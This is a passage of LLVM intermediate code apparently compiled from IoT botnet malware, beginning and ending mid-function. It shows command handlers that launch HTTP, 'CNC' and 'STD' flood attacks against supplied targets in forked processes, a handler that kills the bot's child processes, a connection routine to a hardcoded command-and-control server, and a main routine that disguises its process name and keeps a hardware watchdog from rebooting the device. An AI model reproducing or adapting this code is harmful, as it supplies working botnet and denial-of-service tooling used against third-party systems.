; <label>:508:                                    ; preds = %502
  %509 = load i32, i32* %3, align 4
  %510 = icmp slt i32 %509, 4
  br i1 %510, label %523, label %511

; <label>:511:                                    ; preds = %508
  %512 = load i8**, i8*** %4, align 8
  %513 = getelementptr inbounds i8*, i8** %512, i64 2
  %514 = load i8*, i8** %513, align 8
  %515 = call i32 @atoi(i8* %514) #10
  %516 = icmp slt i32 %515, 1
  br i1 %516, label %523, label %517

; <label>:517:                                    ; preds = %511
  %518 = load i8**, i8*** %4, align 8
  %519 = getelementptr inbounds i8*, i8** %518, i64 3
  %520 = load i8*, i8** %519, align 8
  %521 = call i32 @atoi(i8* %520) #10
  %522 = icmp slt i32 %521, 1
  br i1 %522, label %523, label %524

; <label>:523:                                    ; preds = %517, %511, %508
  br label %721

; <label>:524:                                    ; preds = %517
  %525 = load i8**, i8*** %4, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 1
  %527 = load i8*, i8** %526, align 8
  store i8* %527, i8** %30, align 8
  %528 = load i8**, i8*** %4, align 8
  %529 = getelementptr inbounds i8*, i8** %528, i64 2
  %530 = load i8*, i8** %529, align 8
  %531 = call i32 @atoi(i8* %530) #10
  store i32 %531, i32* %31, align 4
  %532 = load i8**, i8*** %4, align 8
  %533 = getelementptr inbounds i8*, i8** %532, i64 3
  %534 = load i8*, i8** %533, align 8
  %535 = call i32 @atoi(i8* %534) #10
  store i32 %535, i32* %32, align 4
  %536 = load i8*, i8** %30, align 8
  %537 = call i8* @strstr(i8* %536, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %538 = icmp ne i8* %537, null
  br i1 %538, label %539, label %551

; <label>:539:                                    ; preds = %524
  %540 = load i8*, i8** %30, align 8
  %541 = call i8* @strtok(i8* %540, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %541, i8** %33, align 8
  br label %542

; <label>:542:                                    ; preds = %545, %539
  %543 = load i8*, i8** %33, align 8
  %544 = icmp ne i8* %543, null
  br i1 %544, label %545, label %550

; <label>:545:                                    ; preds = %542
  %546 = load i8*, i8** %33, align 8
  %547 = load i32, i32* %31, align 4
  %548 = load i32, i32* %32, align 4
  call void @sendHTTP(i8* %546, i32 %547, i32 %548)
  %549 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %549, i8** %33, align 8
  br label %542

; <label>:550:                                    ; preds = %542
  br label %555

; <label>:551:                                    ; preds = %524
  %552 = load i8*, i8** %30, align 8
  %553 = load i32, i32* %31, align 4
  %554 = load i32, i32* %32, align 4
  call void @sendHTTP(i8* %552, i32 %553, i32 %554)
  br label %555

; <label>:555:                                    ; preds = %551, %550
  br label %721

; <label>:556:                                    ; preds = %502
  %557 = load i8**, i8*** %4, align 8
  %558 = getelementptr inbounds i8*, i8** %557, i64 0
  %559 = load i8*, i8** %558, align 8
  %560 = call i32 @strcmp(i8* %559, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.123, i32 0, i32 0)) #10
  %561 = icmp ne i32 %560, 0
  br i1 %561, label %620, label %562

; <label>:562:                                    ; preds = %556
  %563 = load i32, i32* %3, align 4
  %564 = icmp slt i32 %563, 4
  br i1 %564, label %577, label %565

; <label>:565:                                    ; preds = %562
  %566 = load i8**, i8*** %4, align 8
  %567 = getelementptr inbounds i8*, i8** %566, i64 2
  %568 = load i8*, i8** %567, align 8
  %569 = call i32 @atoi(i8* %568) #10
  %570 = icmp slt i32 %569, 1
  br i1 %570, label %577, label %571

; <label>:571:                                    ; preds = %565
  %572 = load i8**, i8*** %4, align 8
  %573 = getelementptr inbounds i8*, i8** %572, i64 3
  %574 = load i8*, i8** %573, align 8
  %575 = call i32 @atoi(i8* %574) #10
  %576 = icmp slt i32 %575, 1
  br i1 %576, label %577, label %578

; <label>:577:                                    ; preds = %571, %565, %562
  br label %721

; <label>:578:                                    ; preds = %571
  %579 = load i8**, i8*** %4, align 8
  %580 = getelementptr inbounds i8*, i8** %579, i64 1
  %581 = load i8*, i8** %580, align 8
  store i8* %581, i8** %34, align 8
  %582 = load i8**, i8*** %4, align 8
  %583 = getelementptr inbounds i8*, i8** %582, i64 2
  %584 = load i8*, i8** %583, align 8
  %585 = call i32 @atoi(i8* %584) #10
  store i32 %585, i32* %35, align 4
  %586 = load i8**, i8*** %4, align 8
  %587 = getelementptr inbounds i8*, i8** %586, i64 3
  %588 = load i8*, i8** %587, align 8
  %589 = call i32 @atoi(i8* %588) #10
  store i32 %589, i32* %36, align 4
  %590 = load i8*, i8** %34, align 8
  %591 = call i8* @strstr(i8* %590, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %592 = icmp ne i8* %591, null
  br i1 %592, label %593, label %611

; <label>:593:                                    ; preds = %578
  %594 = load i8*, i8** %34, align 8
  %595 = call i8* @strtok(i8* %594, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %595, i8** %37, align 8
  br label %596

; <label>:596:                                    ; preds = %608, %593
  %597 = load i8*, i8** %37, align 8
  %598 = icmp ne i8* %597, null
  br i1 %598, label %599, label %610

; <label>:599:                                    ; preds = %596
  %600 = call i32 @listFork()
  %601 = icmp ne i32 %600, 0
  br i1 %601, label %608, label %602

; <label>:602:                                    ; preds = %599
  %603 = load i8*, i8** %37, align 8
  %604 = load i32, i32* %35, align 4
  %605 = load i32, i32* %36, align 4
  call void @sendCNC(i8* %603, i32 %604, i32 %605)
  %606 = load i32, i32* @mainCommSock, align 4
  %607 = call i32 @close(i32 %606)
  call void @_exit(i32 0) #12
  unreachable

; <label>:608:                                    ; preds = %599
  %609 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %609, i8** %37, align 8
  br label %596

; <label>:610:                                    ; preds = %596
  br label %619

; <label>:611:                                    ; preds = %578
  %612 = call i32 @listFork()
  %613 = icmp ne i32 %612, 0
  br i1 %613, label %614, label %615

; <label>:614:                                    ; preds = %611
  br label %721

; <label>:615:                                    ; preds = %611
  %616 = load i8*, i8** %34, align 8
  %617 = load i32, i32* %35, align 4
  %618 = load i32, i32* %36, align 4
  call void @sendCNC(i8* %616, i32 %617, i32 %618)
  call void @_exit(i32 0) #12
  unreachable

; <label>:619:                                    ; preds = %610
  br label %721

; <label>:620:                                    ; preds = %556
  %621 = load i8**, i8*** %4, align 8
  %622 = getelementptr inbounds i8*, i8** %621, i64 0
  %623 = load i8*, i8** %622, align 8
  %624 = call i32 @strcmp(i8* %623, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.124, i32 0, i32 0)) #10
  %625 = icmp ne i32 %624, 0
  br i1 %625, label %674, label %626

; <label>:626:                                    ; preds = %620
  %627 = load i32, i32* %3, align 4
  %628 = icmp slt i32 %627, 4
  br i1 %628, label %641, label %629

; <label>:629:                                    ; preds = %626
  %630 = load i8**, i8*** %4, align 8
  %631 = getelementptr inbounds i8*, i8** %630, i64 2
  %632 = load i8*, i8** %631, align 8
  %633 = call i32 @atoi(i8* %632) #10
  %634 = icmp slt i32 %633, 1
  br i1 %634, label %641, label %635

; <label>:635:                                    ; preds = %629
  %636 = load i8**, i8*** %4, align 8
  %637 = getelementptr inbounds i8*, i8** %636, i64 3
  %638 = load i8*, i8** %637, align 8
  %639 = call i32 @atoi(i8* %638) #10
  %640 = icmp slt i32 %639, 1
  br i1 %640, label %641, label %642

; <label>:641:                                    ; preds = %635, %629, %626
  br label %721

; <label>:642:                                    ; preds = %635
  %643 = load i8**, i8*** %4, align 8
  %644 = getelementptr inbounds i8*, i8** %643, i64 1
  %645 = load i8*, i8** %644, align 8
  store i8* %645, i8** %38, align 8
  %646 = load i8**, i8*** %4, align 8
  %647 = getelementptr inbounds i8*, i8** %646, i64 2
  %648 = load i8*, i8** %647, align 8
  %649 = call i32 @atoi(i8* %648) #10
  store i32 %649, i32* %39, align 4
  %650 = load i8**, i8*** %4, align 8
  %651 = getelementptr inbounds i8*, i8** %650, i64 3
  %652 = load i8*, i8** %651, align 8
  %653 = call i32 @atoi(i8* %652) #10
  store i32 %653, i32* %40, align 4
  %654 = load i8*, i8** %38, align 8
  %655 = call i8* @strstr(i8* %654, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %656 = icmp ne i8* %655, null
  br i1 %656, label %657, label %669

; <label>:657:                                    ; preds = %642
  %658 = load i8*, i8** %38, align 8
  %659 = call i8* @strtok(i8* %658, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %659, i8** %41, align 8
  br label %660

; <label>:660:                                    ; preds = %663, %657
  %661 = load i8*, i8** %41, align 8
  %662 = icmp ne i8* %661, null
  br i1 %662, label %663, label %668

; <label>:663:                                    ; preds = %660
  %664 = load i8*, i8** %41, align 8
  %665 = load i32, i32* %39, align 4
  %666 = load i32, i32* %40, align 4
  call void @sendSTD(i8* %664, i32 %665, i32 %666)
  %667 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %667, i8** %41, align 8
  br label %660

; <label>:668:                                    ; preds = %660
  br label %673

; <label>:669:                                    ; preds = %642
  %670 = load i8*, i8** %38, align 8
  %671 = load i32, i32* %39, align 4
  %672 = load i32, i32* %40, align 4
  call void @sendSTD(i8* %670, i32 %671, i32 %672)
  br label %673

; <label>:673:                                    ; preds = %669, %668
  br label %721

; <label>:674:                                    ; preds = %620
  %675 = load i8**, i8*** %4, align 8
  %676 = getelementptr inbounds i8*, i8** %675, i64 0
  %677 = load i8*, i8** %676, align 8
  %678 = call i32 @strcmp(i8* %677, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i32 0, i32 0)) #10
  %679 = icmp ne i32 %678, 0
  br i1 %679, label %721, label %680

; <label>:680:                                    ; preds = %674
  store i32 0, i32* %42, align 4
  store i64 0, i64* %43, align 8
  br label %681

; <label>:681:                                    ; preds = %707, %680
  %682 = load i64, i64* %43, align 8
  %683 = load i64, i64* @numpids, align 8
  %684 = icmp ult i64 %682, %683
  br i1 %684, label %685, label %710

; <label>:685:                                    ; preds = %681
  %686 = load i32*, i32** @pids, align 8
  %687 = load i64, i64* %43, align 8
  %688 = getelementptr inbounds i32, i32* %686, i64 %687
  %689 = load i32, i32* %688, align 4
  %690 = icmp ne i32 %689, 0
  br i1 %690, label %691, label %706

; <label>:691:                                    ; preds = %685
  %692 = load i32*, i32** @pids, align 8
  %693 = load i64, i64* %43, align 8
  %694 = getelementptr inbounds i32, i32* %692, i64 %693
  %695 = load i32, i32* %694, align 4
  %696 = call i32 @getpid() #2
  %697 = icmp ne i32 %695, %696
  br i1 %697, label %698, label %706

; <label>:698:                                    ; preds = %691
  %699 = load i32*, i32** @pids, align 8
  %700 = load i64, i64* %43, align 8
  %701 = getelementptr inbounds i32, i32* %699, i64 %700
  %702 = load i32, i32* %701, align 4
  %703 = call i32 @kill(i32 %702, i32 9) #2
  %704 = load i32, i32* %42, align 4
  %705 = add nsw i32 %704, 1
  store i32 %705, i32* %42, align 4
  br label %706

; <label>:706:                                    ; preds = %698, %691, %685
  br label %707

; <label>:707:                                    ; preds = %706
  %708 = load i64, i64* %43, align 8
  %709 = add i64 %708, 1
  store i64 %709, i64* %43, align 8
  br label %681

; <label>:710:                                    ; preds = %681
  %711 = load i32, i32* %42, align 4
  %712 = icmp sgt i32 %711, 0
  br i1 %712, label %713, label %717

; <label>:713:                                    ; preds = %710
  %714 = load i32, i32* @mainCommSock, align 4
  %715 = load i32, i32* %42, align 4
  %716 = call i32 (i32, i8*, ...) @sockprintf(i32 %714, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i32 %715)
  br label %720

; <label>:717:                                    ; preds = %710
  %718 = load i32, i32* @mainCommSock, align 4
  %719 = call i32 (i32, i8*, ...) @sockprintf(i32 %718, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.127, i32 0, i32 0))
  br label %720

; <label>:720:                                    ; preds = %717, %713
  br label %721

; <label>:721:                                    ; preds = %720, %674, %673, %641, %619, %614, %577, %555, %523, %501, %426, %374, %286, %225, %220, %183, %161, %156, %121, %95, %88, %49
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

declare i32 @killer_kill(...) #3

declare i32 @killer_init(...) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 4096, i32 16, i1 false)
  %4 = load i32, i32* @mainCommSock, align 4
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %0
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = call i32 @close(i32 %7)
  store i32 0, i32* @mainCommSock, align 4
  br label %9

; <label>:9:                                      ; preds = %6, %0
  %10 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %11 = load i8*, i8** @cncip, align 8
  %12 = call i8* @strcpy(i8* %10, i8* %11) #2
  %13 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %13, i32* @mainCommSock, align 4
  %14 = load i32, i32* @mainCommSock, align 4
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %16 = load i32, i32* @cncport, align 4
  %17 = call i32 @connectTimeout(i32 %14, i8* %15, i32 %16, i32 30)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %20, label %19

; <label>:19:                                     ; preds = %9
  store i32 1, i32* %1, align 4
  br label %21

; <label>:20:                                     ; preds = %9
  store i32 0, i32* %1, align 4
  br label %21

; <label>:21:                                     ; preds = %20, %19
  %22 = load i32, i32* %1, align 4
  ret i32 %22
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.128, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.129, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.130, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79

; <label>:97:                                     ; preds = %79
  br label %98

; <label>:98:                                     ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

; <label>:101:                                    ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [256 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca [1024 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca [4096 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca [1024 x i8], align 16
  %29 = alloca i32, align 4
  %30 = alloca [10 x i8*], align 16
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i8** %6, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @strlen(i8* %39) #10
  %41 = call i8* @strncpy(i8* %36, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i64 %40) #2
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i8** %43, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = ptrtoint i8* %44 to i64
  %46 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %45, i32 0, i32 0, i32 0)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = call i32 @getpid() #2
  %49 = xor i32 %47, %48
  call void @srand(i32 %49) #2
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = call i32 @getpid() #2
  %52 = xor i32 %50, %51
  call void @init_rand(i32 %52)
  store i32 0, i32* %7, align 4
  %53 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.131, i32 0, i32 0))
  %54 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.132, i32 0, i32 0))
  store i32 0, i32* %8, align 4
  %55 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.133, i32 0, i32 0), i32 2)
  store i32 %55, i32* %8, align 4
  %56 = icmp ne i32 %55, -1
  br i1 %56, label %60, label %57

; <label>:57:                                     ; preds = %2
  %58 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.134, i32 0, i32 0), i32 2)
  store i32 %58, i32* %8, align 4
  %59 = icmp ne i32 %58, -1
  br i1 %59, label %60, label %71

; <label>:60:                                     ; preds = %57, %2
  store i32 1, i32* %9, align 4
  %61 = load i32, i32* %8, align 4
  %62 = call i32 (i32, i64, ...) @ioctl(i32 %61, i64 2147768068, i32* %9) #2
  %63 = call i32 @fork() #2
  store i32 %63, i32* %10, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %70

; <label>:65:                                     ; preds = %60
  br label %66

; <label>:66:                                     ; preds = %66, %65
  %67 = load i32, i32* %8, align 4
  %68 = call i32 (i32, i64, ...) @ioctl(i32 %67, i64 2147768069, i32 0) #2
  %69 = call i32 @sleep(i32 10)
  br label %66

; <label>:70:                                     ; preds = %60
  br label %71

; <label>:71:                                     ; preds = %70, %57
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.135, i32 0, i32 0), i8** %12, align 8
  %72 = load i8*, i8** %12, align 8
  %73 = call %struct._IO_FILE* @fopen(i8* %72, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store %struct._IO_FILE* %73, %struct._IO_FILE** %13, align 8
  %74 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %75 = icmp eq %struct._IO_FILE* %74, null
  br i1 %75, label %76, label %79

; <label>:76:                                     ; preds = %71
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.137, i32 0, i32 0), i8** %12, align 8
  %77 = load i8*, i8** %12, align 8
  %78 = call %struct._IO_FILE* @fopen(i8* %77, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store %struct._IO_FILE* %78, %struct._IO_FILE** %13, align 8
  br label %79

; <label>:79:                                     ; preds = %76, %71
  %80 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %81 = icmp ne %struct._IO_FILE* %80, null
  br i1 %81, label %82, label %159

; <label>:82:                                     ; preds = %79
  %83 = load i8**, i8*** %5, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 0
  %85 = load i8*, i8** %84, align 8
  %86 = call i64 @strlen(i8* %85) #10
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %16, align 4
  store i32 0, i32* %17, align 4
  %88 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %89 = call i8* @getcwd(i8* %88, i64 256) #2
  %90 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %91 = call i32 @strcmp(i8* %90, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #10
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %155

; <label>:93:                                     ; preds = %82
  br label %94

; <label>:94:                                     ; preds = %104, %93
  %95 = load i8**, i8*** %5, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 0
  %97 = load i8*, i8** %96, align 8
  %98 = load i32, i32* %16, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %97, i64 %99
  %101 = load i8, i8* %100, align 1
  %102 = sext i8 %101 to i32
  %103 = icmp ne i32 %102, 47
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %94
  %105 = load i32, i32* %16, align 4
  %106 = add nsw i32 %105, -1
  store i32 %106, i32* %16, align 4
  br label %94

; <label>:107:                                    ; preds = %94
  %108 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %109 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %110 = load i8**, i8*** %5, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 0
  %112 = load i8*, i8** %111, align 8
  %113 = load i32, i32* %16, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = call i32 (i8*, i8*, ...) @sprintf(i8* %108, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i32 0, i32 0), i8* %109, i8* %115) #2
  br label %117

; <label>:117:                                    ; preds = %133, %107
  %118 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %119 = call i32 @feof(%struct._IO_FILE* %118) #2
  %120 = icmp ne i32 %119, 0
  %121 = xor i1 %120, true
  br i1 %121, label %122, label %134

; <label>:122:                                    ; preds = %117
  %123 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %124 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %125 = call i8* @fgets(i8* %123, i32 1024, %struct._IO_FILE* %124)
  %126 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %127 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %128 = call i32 @strcasecmp(i8* %126, i8* %127) #10
  %129 = icmp ne i32 %128, 0
